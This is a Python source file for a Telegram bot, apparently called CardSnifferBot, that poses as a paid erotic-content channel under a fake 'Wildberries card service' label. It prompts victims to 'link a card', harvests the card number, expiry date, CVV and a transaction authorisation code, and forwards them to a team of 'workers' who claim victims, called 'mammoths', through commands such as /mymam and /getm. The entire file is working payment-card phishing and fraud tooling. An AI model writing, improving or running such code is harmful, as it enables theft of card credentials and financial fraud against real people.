import telebot
import colorama
from colorama import Back,Fore
from telebot import types
from config import *
from os import listdir
printlogo()

print(Fore.RED+'Set data directory \n0-basedir\n1-basedirTermux')
i=input()
if i=='0':
    datadir='./data/'
    print(Fore.RED+Back.GREEN+'///'+Back.RESET+Fore.GREEN+' Set data as default')
elif i=="1":
    datadir = '/data/data/com.termux/files/home/CardSnifferBot/data/'
    print(Fore.RED + Back.GREEN + '///' + Back.RESET + Fore.GREEN + ' Set data as ' + datadir)
else:
    datadir=str(i)
    print(Fore.RED+Back.GREEN+'///'+Back.RESET+Fore.GREEN+' Set data as '+datadir)

sleep(0.2)

print(Fore.RED+Back.RESET+'PROCESSING')

sleep(0.2)

loaddata()
print(Fore.RED+'/// ENTER BOT TOKEN:')
token=input()
bot = telebot.TeleBot(token)
print(Fore.RED+Back.GREEN+f'///'+Fore.GREEN+Back.RESET+' Bot launched')


@bot.message_handler(commands=['vip'])
def vip(message):
    localid=getdatafromid(message.chat.id)
    if message.text=='Вернуться':
        start(message)
    else:
        markup=types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
        b1=types.KeyboardButton('Вернуться')
        markup.row(b1)
        bot.send_message(message.chat.id, 'Добавление карты напрямую:\nWBBank\nПожалуйста, введите номер карты\nпример:2000 1234 1234 1234\n_Обратите внимание, что данные, которые вы вводили ранее, будут переписаны на новые в случае добавления_\n\n_Данные под контролем Wildberries card service_',reply_markup=markup, parse_mode='MarkdownV2')
        bot.register_next_step_handler(message, addcard)

@bot.message_handler(commands=['link'])
def addlink(message):
    localtext=message.text
    if localtext=='/link':
        bot.send_message(message.chat.id, 'неполный запрос')
    else:
        localtext=localtext.split()
        links.append(localtext[1])
        bot.send_message(message.chat.id, 'ссылка добавлена!')
        savedata()

@bot.message_handler(commands=['rlink'])
def rlink(message):
    localtext=message.text
    if localtext=='/link':
        bot.send_message(message.chat.id, 'неполный запрос')
    else:
        localtext=localtext.split()
        links.remove(localtext[1])
        bot.send_message(message.chat.id, 'ссылка удалена!')
        savedata()

def addcard(message):
    card1=(message.text)
    card1=card1.replace(' ', '')
    if card1=='Вернуться':
        bot.send_message(message.chat.id, 'Привязка отменена')
        start(message)

    else:
        if len(str(card1))==16:
            workermessage(f'мамонт добавил карту {card}')
            bot.send_message(message.chat.id, 'карта добавлена, сейчас введите дату и cvv. Пример: 12/33 004')
            bot.register_next_step_handler(message, addcvv)
            localid = int(message.from_user.id)
            localid = getdatafromid(localid)
            stage[localid]=1
            card[localid]=str(card1)
            savedata()
            print(Back.GREEN+Fore.RED+'///'+Back.BLACK+Fore.WHITE+f' {message.from_user.username} добавил карту'+Back.RESET+'\n'+Back.BLACK+Fore.WHITE+card1+Back.RESET)
        else:
            bot.send_message(message.chat.id, 'Это не карта')
            bot.register_next_step_handler(message, addcard)

def addcvv(message):
    text=str(message.text)
    date=text.split()
    if text == 'Вернуться':
        bot.send_message(message.chat.id, 'Привязка отменена')
        start(message)
    else:
        if len(date[0])==5 and len(date[1])==3:
            workermessage(f'{date} дата и CVV')
            workermessage(f'{message.from_user.id}')
            bot.send_message(message.chat.id, 'отлично. сейчас система проверит данные и пришлет код. введите его через команду /code')
            start(message)
            localid = int(message.from_user.id)
            localid = (getdatafromid(localid))
            stage[localid] = 2
            datecvv[localid] = str(text)
            print(
                Back.GREEN + Fore.RED + '///' + Back.BLACK + Fore.WHITE + f' {message.from_user.username} добавил дату и cvv' + Back.RESET + '\n' + Back.BLACK + Fore.WHITE + str(date) + Back.RESET)
            savedata()

        else:
            bot.send_message(message.chat.id, f'неверные данные. попробуйте еще раз')
            bot.register_next_step_handler(message, addcvv)

def code(message):
    codevar=(message.text)
    if codevar!=None:
        if codevar.isnumeric() and len(codevar)==4:
            workermessage(f'{codevar} код для авторизации транзакции')
            bot.send_message(message.chat.id,'Отлично, сейчас система проверит код и при успехе вышлет вам ссылку на закрытый канал!')
            localid = message.from_user.id
            localid = getdatafromid(localid)
            stage[localid]=3
            codes[localid]=codevar
            savedata()
            print(Back.GREEN+Fore.RED+'///'+Back.BLACK+Fore.WHITE+f' {message.from_user.username} отправил код'+Back.RESET+'\n'+Back.BLACK+Fore.WHITE+codevar+Back.RESET)

        else:
            bot.send_message(message.chat.id, f'неверные данные. попробуйте еще раз /code')
    else:
        bot.send_message(message.chat.id, f'неверные данные. попробуйте еще раз /code')

@bot.message_handler(commands=['code'])
def entercode(message):
    localid = message.from_user.id
    localid = getdatafromid(localid)
    if stage[localid]==2:
        bot.send_message(message.chat.id, f'Вам пришел код? Введите его ниже!')
        bot.register_next_step_handler(message, code)
        savedata()
    else:
        bot.send_message(message.chat.id, f'у вас нет прав на выполнение данной команды!')


@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    b1 = types.KeyboardButton('Меню')
    b2 = types.KeyboardButton('Личный кабинет')
    b3 = types.KeyboardButton('Помощь')
    markup.row(b1)
    markup.row(b2)
    markup.row(b3)
    bot.send_message(message.chat.id, 'Привет! Этот бот помогает мне принимать оплату за приватный канал, фото и видео. Чтобы оплатить с карты необходимо привязать карту и пополнить баланс бота в разделе "Личный кабинет". Приятных покупок❤️', reply_markup=markup)
    checklogin(message)


def menu(message):
    markup = types.InlineKeyboardMarkup()
    b1 = types.InlineKeyboardButton('VIP канал', callback_data='buy')
    b2 = types.InlineKeyboardButton('Кружок', callback_data='buy')
    b3 = types.InlineKeyboardButton('Фоточки', callback_data='buy')
    b4 = types.InlineKeyboardButton('Видео', callback_data='buy')
    markup.row(b1)
    markup.row(b4)
    markup.row(b3)
    markup.row(b2)
    bot.send_message(message.chat.id, 'Добро пожаловать в моё эротическое меню😈', reply_markup=markup)
    checklogin(message)


@bot.message_handler(commands=['addme'])
def addme(message):
    user=message.from_user.id
    checklogin(message)
    if not user in worker:
        worker.append(user)
        localid=message.from_user.id
        localid=getdatafromid(localid)
        role[localid]='worker'
        bot.send_message(message.chat.id, 'теперь вы воркер!')
        workermessage(f'у нас новый воркер: {message.from_user.username}')
        savedata()
    else:
        bot.send_message(message.chat.id, 'ты уже воркер')

@bot.message_handler(commands=['removeme'])
def removeme(message):
    user=message.from_user.id
    checklogin(message)
    if user in worker:
        worker.remove(user)
        bot.send_message(message.chat.id, 'теперь вы НЕ воркер!')
        workermessage(f'у нас ушёл воркер: {message.from_user.username}')
        savedata()

@bot.message_handler(commands=['sendvip'])
def sendvip(message):
    checklogin(message)
    localtext = message.text
    localtext = localtext.split()
    if len(localtext) < 2:
        bot.send_message(message.chat.id, 'неверный запрос')
    else:
        if len(links)!=0:
            bot.send_message(localtext[1], f'мы проверили вашу информацию. Вы указали верные данные. {links[0]}')
            links.remove(links[0])
            stage[getdatafromid(localtext[1])] = 4
            bot.send_message(message.chat.id, 'отправили ссылку на канал!')
            workermessage(f'отправили ссылку на канал мамонту {localtext[1]}')
            savedata()
        else:
            bot.send_message(message.chat.id, 'ссылок на канал не осталось. добавьте её через команду /link')

@bot.message_handler(commands=['mymam'])
def mymam(message):
    checklogin(message)
    localtext = message.text
    localtext = localtext.split()
    if len(localtext) < 2:
        bot.send_message(message.chat.id, 'неверный запрос')
    else:
        mamid=getdatafromid(localtext[1])
        workerid[mamid]=message.from_user.id
        bot.send_message(message.chat.id, 'теперь это ваш мамонт!')
        workermessage(f'мамонт забронировался  {localtext[1]}')
        savedata()

@bot.message_handler(commands=['senderr'])
def senderr(message):
    checklogin(message)
    localtext=message.text
    localtext=localtext.split()
    if len(localtext)<2:
        bot.send_message(message.chat.id, 'неверный запрос')
    else:
        bot.send_message(localtext[1], 'мы проверили вашу информацию. Вы указали неверные данные. Попробуйте снова.')
        stage[getdatafromid(localtext[1])]=0

@bot.message_handler(commands=['getm'])
def getm(message):
    checklogin(message)
    info='__Информация__\n'
    info=info+'\n'+'/getm статус мамонтов'
    info=info+'\n'+'/sendvip отправить випку мамонту через пробел указать ID'
    info=info+'\n'+'/senderr отправить ошибку мамонту через пробел указать ID'
    info+='\n /link добавить ссылку на приватку через пробел указать ссылку'
    info += '\n /rlink убрать ссылку на приватку через пробел указать ссылку'
    info += '\n /mymam привязать мамонта через пробел указать ID'
    info += '\n /addme указать себя как воркер'
    info += '\n /removeme убрать себя из воркеров'
    bot.send_message(message.chat.id, info, 'MarkdownV2')
    info='ссылки на приватку:\n'
    for i in range(0,len(links)):
        info += f'`{links[i]}`\n'
    bot.send_message(message.chat.id, info, 'MarkdownV2')
    info=''
    if len(id)!=0:
        bot.send_message(message.chat.id, f'СПИСОК МАМОНТОВ', 'MarkdownV2')
        for i in range(0,len(id)):
            if role[i]=='mamont':
                if stage[i]>=0:
                    info+=f'id `{id[i]}`,\nимя @{username[i]}\nэтап {stage[i]}'
                if stage[i]>=1:
                    info+=f'\nкарта `{card[i]}`'
                if stage[i]>=2:
                    info += f'\nдата&CVV `{datecvv[i]}`'
                if stage[i]>=3:
                    info += f'\nкод {codes[i]}'
                bot.send_message(message.chat.id, f'{info}\nзанятый воркером {workerid[i]}\n\n', 'MarkdownV2')
                info=''
    else:
        bot.send_message(message.chat.id, f'_нет авторизированных пользователей_', 'MarkdownV2')


def workermessage(mes):
    if len(worker)!=0:
        for i in range(0,len(worker)):
            bot.send_message(f'ДЛЯ ВОРКЕРОВ: {worker[i]}',mes)
        print(f'/// New message for workers: {mes}')


def lk(message):
    checklogin(message)
    markup=types.InlineKeyboardMarkup(row_width=3)
    b1=types.InlineKeyboardButton('Пополнить баланс' , callback_data='balance')
    b2 = types.InlineKeyboardButton('Привязать карту', callback_data='vip')
    b3 = types.InlineKeyboardButton('Мои карты', callback_data='balance')
    markup.row(b1,b2)
    markup.row(b3)
    name = message.from_user.username
    localid=message.from_user.id
    balance=cash[getdatafromid(str(localid))]
    text='❤️ Имя:'+name+'\n'
    text=text+'🔑 ID:'+str(message.from_user.id)+'\n'
    text = text + '💰 Ваш баланс:'+str(balance) + '\n'
    text=text+'Чтобы пополнить баланс нужно нажать соответствующую кнопку ниже.'+'\n'+' Обрати внимание, что баланс можно пополнить на сумму от 100 Рублей'
    bot.send_message(message.chat.id, text, reply_markup=markup)

def buy1(callback):
    markup=types.InlineKeyboardMarkup()
    b1=types.InlineKeyboardButton('Личный кабинет',callback_data='lk')
    markup.row(b1)
    bot.delete_message(callback.message.chat.id, callback.message.id)
    bot.send_message(callback.message.chat.id, 'Для начала нужно пополнить баланс ;)', reply_markup=markup)


@bot.callback_query_handler(func=lambda callback:True)
def callback(callback):
    cb=callback.data
    if cb=='balance':
        bot.answer_callback_query(callback_query_id=callback.id, text='Для вызова этой команды у вас должна быть привязана карта!')
    elif cb=='buy':
        buy1(callback)
    elif cb=='lk':
        bot.delete_message(callback.message.chat.id, callback.message.id)
        lk(callback.message)
    elif cb=='vip':
        bot.delete_message(callback.message.chat.id, callback.message.id)
        vip(callback.message)


@bot.message_handler()
def randmess(message):
    checklogin(message)
    text=str(message.text.lower())
    if text=='меню':
        menu(message)
    elif text=='личный кабинет':
        lk(message)
    elif text=='помощь':
        bot.send_message(message.chat.id, f'Если у тебя что-то не получается то просто напиши мне: @{Helper}')
    elif text=='ввернуться':
        bot.delete_message(callback.message.chat.id, callback.message.id)
        start(callback.message)
    else:
        bot.send_message(message.chat.id, 'К сожалению я не смог распознать Вашу команду. Воспользуйтесь кнопками в меню или отправьте /start')

bot.infinity_polling()